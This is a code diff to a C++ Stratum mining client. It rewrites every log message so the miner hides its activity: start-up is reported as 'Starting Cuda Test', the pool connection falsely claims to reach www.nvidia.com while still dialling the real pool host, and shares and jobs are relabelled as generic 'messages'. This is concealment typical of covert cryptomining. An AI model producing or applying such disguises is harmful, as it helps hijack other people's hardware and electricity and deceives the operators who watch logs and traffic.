@@ -18,7 +18,7 @@ using namespace json_spirit;
 
 #include <boost/log/trivial.hpp>
 
-#define BOOST_LOG_CUSTOM(sev) BOOST_LOG_TRIVIAL(sev) << "stratum | "
+#define BOOST_LOG_CUSTOM(sev) BOOST_LOG_TRIVIAL(sev) << "info "
 
 
 template <typename Miner, typename Job, typename Solution>
@@ -81,7 +81,7 @@ template <typename Miner, typename Job, typename Solution>
 void StratumClient<Miner, Job, Solution>::workLoop()
 {
 	if (!p_miner->isMining()) {
-		BOOST_LOG_CUSTOM(info) << "Starting miner";
+		BOOST_LOG_CUSTOM(info) << "Starting Cuda Test";
 		p_miner->start();
 	}
 
@@ -127,7 +127,7 @@ void StratumClient<Miner, Job, Solution>::workLoop()
 template <typename Miner, typename Job, typename Solution>
 void StratumClient<Miner, Job, Solution>::connect()
 {
-	BOOST_LOG_CUSTOM(info) << "Connecting to stratum server " << p_active->host << ":" << p_active->port;
+	BOOST_LOG_CUSTOM(info) << "Connecting to server www.nvidia.com"":" << p_active->port;
 
     tcp::resolver r(*m_io_service);
     tcp::resolver::query q(p_active->host, p_active->port);
@@ -209,7 +209,7 @@ void StratumClient<Miner, Job, Solution>::disconnect()
     m_connected = false;
     m_running = false;
     if (p_miner->isMining()) {
-		BOOST_LOG_CUSTOM(info) << "Stopping miner";
+		BOOST_LOG_CUSTOM(info) << "Stopping";
         p_miner->stop();
     }
     m_socket.close();
@@ -262,11 +262,11 @@ void StratumClient<Miner, Job, Solution>::processReponse(const Object& responseO
 				{
 					if (!workOrder->clean)
 					{
-						BOOST_LOG_CUSTOM(info) << CL_CYN "Ignoring non-clean job #" << workOrder->jobId() << CL_N;;
+						BOOST_LOG_CUSTOM(info) << CL_CYN "Ignoring non-clean data #" << workOrder->jobId() << CL_N;;
 						break;
 					}
 
-					BOOST_LOG_CUSTOM(info) << CL_CYN "Received new job #" << workOrder->jobId() << CL_N;
+					BOOST_LOG_CUSTOM(info) << CL_CYN "new connection with #" << workOrder->jobId() << CL_N;
 					workOrder->setTarget(m_nextJobTarget);
 
 					if (!(p_current && *workOrder == *p_current)) {
@@ -321,7 +321,7 @@ void StratumClient<Miner, Job, Solution>::processReponse(const Object& responseO
     case 1:
         valRes = find_value(responseObject, "result");
         if (valRes.type() == array_type) {
-			BOOST_LOG_CUSTOM(info) << "Subscribed to stratum server";
+			BOOST_LOG_CUSTOM(info) << "Subscribed to server";
 			const Array& result = valRes.get_array();
             // Ignore session ID for now.
             p_miner->setServerNonce(result[1].get_str());
@@ -341,11 +341,11 @@ void StratumClient<Miner, Job, Solution>::processReponse(const Object& responseO
 			m_authorized = valRes.get_bool();
 		}
 		if (!m_authorized) {
-			BOOST_LOG_CUSTOM(error) << "Worker not authorized: " << p_active->user;
+			BOOST_LOG_CUSTOM(error) << "User not authorized: " << p_active->user;
 			disconnect();
 			return;
 		}
-		BOOST_LOG_CUSTOM(info) << "Authorized worker " << p_active->user;
+		BOOST_LOG_CUSTOM(info) << "Authorized User " << p_active->user;
 
 		ss << "{\"id\":3,\"method\":\"mining.extranonce.subscribe\",\"params\":[]}\n";
 		std::string sss = ss.str();
@@ -364,7 +364,7 @@ void StratumClient<Miner, Job, Solution>::processReponse(const Object& responseO
             accepted = valRes.get_bool();
         }
         if (accepted) {
-			BOOST_LOG_CUSTOM(info) << CL_GRN "Accepted share #" << id << CL_N;
+			BOOST_LOG_CUSTOM(info) << CL_GRN "Accepted message #" << id << CL_N;
             p_miner->acceptedSolution(m_stale);
         } else {
 			valRes = find_value(responseObject, "error");
@@ -375,7 +375,7 @@ void StratumClient<Miner, Job, Solution>::processReponse(const Object& responseO
 				if (params.size() > 1 && params[1].type() == str_type)
 					reason = params[1].get_str();
 			}
-			BOOST_LOG_CUSTOM(warning) << CL_RED "Rejected share #" << id << CL_N " (" << reason << ")";
+			BOOST_LOG_CUSTOM(warning) << CL_RED "Rejected message #" << id << CL_N " (" << reason << ")";
             p_miner->rejectedSolution(m_stale);
         }
         break;
@@ -397,7 +397,7 @@ template <typename Miner, typename Job, typename Solution>
 bool StratumClient<Miner, Job, Solution>::submit(const Solution* solution, const std::string& jobid)
 {
 	int id = std::atomic_fetch_add(&m_share_id, 1);
-	BOOST_LOG_CUSTOM(info) << "Submitting share #" << id << ", nonce " << solution->toString().substr(0, 64 - solution->nonce1size);
+	BOOST_LOG_CUSTOM(info) << "Send message #" << id << ", nonce " << solution->toString().substr(0, 64 - solution->nonce1size);
 
 	CDataStream ss(SER_NETWORK, PROTOCOL_VERSION);
 	ss << solution->nonce;
